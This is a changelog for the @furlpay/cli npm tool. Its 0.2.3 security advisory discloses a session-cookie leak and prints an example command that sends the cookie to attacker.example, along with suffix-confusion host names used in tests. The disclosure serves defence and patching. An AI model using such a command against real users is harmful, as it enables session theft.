# Changelog

All notable changes to `@furlpay/cli`.

This project follows [Semantic Versioning](https://semver.org/). While the
version is `0.x`, the public CLI surface may still change between minor
releases; patch releases are always safe to take.

## 0.4.0 — 2026-11-13

> Note: the `0.3.x` line was developed in the internal monorepo and never
> published to npm (the npm registry's previous release is `0.2.2`). This
> entry therefore consolidates everything shipping in the first npm release
> since `0.2.2`.

### Added

- **`furlpay update`** — installation-aware self-update command with
  `--check` (report only), `--latest`, `--version X.Y.Z` (explicit pin/rollback,
  confirmed before downgrading), and `--channel stable|beta`. Detects the
  install method (npm global / npx / Homebrew) and only self-updates npm
  installs; everything else gets the exact manual command. Update checks are
  anonymous (no credentials are ever transmitted) and can be disabled with
  `furlpay config set update.check false`.
- **`furlpay doctor` — Installation & Updates section**: install method,
  executable path, npm registry sanity, and latest-on-npm version.
- **Installers**: `install.sh` (Linux/macOS) and `install.ps1` (Windows) —
  secure npm-bootstrap scripts that verify the Node floor (≥ 22.19.0), warn on
  non-official registry mirrors, never use sudo/elevation, and verify the
  installed `furlpay --version` after install. Support `--version`,
  `--channel`, `--uninstall`, and `--dry-run`.
- **Release pipeline** (`.github/workflows/release.yml`): tag-driven
  (`v*.*.*`) — tag/package version consistency gate, typecheck, build, tests,
  `npm pack` tarball contents check, cross-OS smoke install (including an MCP
  stdio initialize/tools-list handshake), SHA-256 `checksums.txt`, CycloneDX
  SBOM, sigstore build-provenance attestations, GitHub Release, and
  provenance-bearing npm publish (OIDC trusted publishing, or a granular token
  via `NPM_PUBLISH_MODE=token`).
- `docs/INSTALLATION.md`, `docs/UPDATING.md`, `docs/RELEASING.md`,
  `docs/PACKAGING.md`.

### Changed

- **`engines.node` corrected from `>=18` to `>=22.19.0`.** The previous floor
  was false advertising: `undici@8` requires ≥ 22.19.0 and
  `@stellar/stellar-sdk@17` requires ≥ 22.12.0, so on Node 18–21 the CLI
  would crash on import. npm now refuses the install instead.
- Package `files` allowlist tightened: `src/` and `docs/` no longer ship in
  the tarball (they were dead weight in the published package — runtime uses
  `bin/`, `lib/`, and the compiled `dist/`).
- `npm publish` now carries `publishConfig.provenance` and
  `prepublishOnly` runs the full build/entrypoint/version-sync verification
  (`scripts/build.js`) instead of a bare compile.

### Fixed

- `@stellar/stellar-sdk` upgraded 15 → 17, clearing all 42 open Dependabot
  advisories.
- Escrow lifecycle hardening (fund/release require a real `--tx-hash`;
  unauthorized actors and malformed proof hashes fail closed).
- Honesty fixes in the TUI/RWA surfaces: fabricated HLP share-price/APY
  figures removed; live-vs-simulated labels enforced at runtime.
- Supply-chain: CI actions SHA-pinned; `mcp-publisher` pinned to v1.8.9;
  `ws` lockfile bumped to 8.23.0.

## 0.2.3 — 2026-08-10

### Security

**Fixed: the session cookie could be sent to an arbitrary host.**

`--api-base <url>` was used verbatim, `furlpay api <METHOD> <absolute-url>`
allowed a full URL where a path was expected, plain `http` was permitted, and
the `furlpay_session` cookie was attached to whatever host resulted. A
documented convenience flag was therefore a credential-exfiltration primitive:

```
furlpay api GET https://attacker.example/x   →   Cookie: furlpay_session=...
```

Anyone who could persuade a logged-in user to run a command with an
attacker-supplied `--api-base`, or paste a command containing an absolute URL,
could capture a live session.

The cookie is now withheld unless the resolved target is `furlpay.com` (or a
subdomain) over TLS, or loopback (`localhost`, `127.0.0.1`, `::1`) for local
development. Requests to other hosts still run — an untrusted base is often a
legitimate local mock — they simply carry no credential, and the CLI says so on
stderr rather than failing later with a confusing `401`.

Plain `http` to a real host is untrusted even when the hostname is correct: a
cookie sent in the clear is a cookie disclosed to everything on the path.

- **Affected:** `<= 0.2.2`
- **Fixed in:** `0.2.3`
- **Action:** upgrade with `npm i -g @furlpay/cli@latest`. If you ran the CLI
  against a host you do not control, run `furlpay logout` (or `furlpay login`
  again) to rotate the session.

Covered by `test/credential-trust.test.js`, which pins the boundary including
the suffix-confusion cases a naive `endsWith("furlpay.com")` would accept
(`furlpay.com.evil.example`, `evilfurlpay.com`) and the cloud metadata address.

### Packaging

- Added `repository`, `homepage` and `bugs` metadata.
- Enabled `publishConfig.provenance` so published builds carry a verifiable
  link to the source and build that produced them.

## 0.2.2 and earlier

See the release history on npm and the commit log.
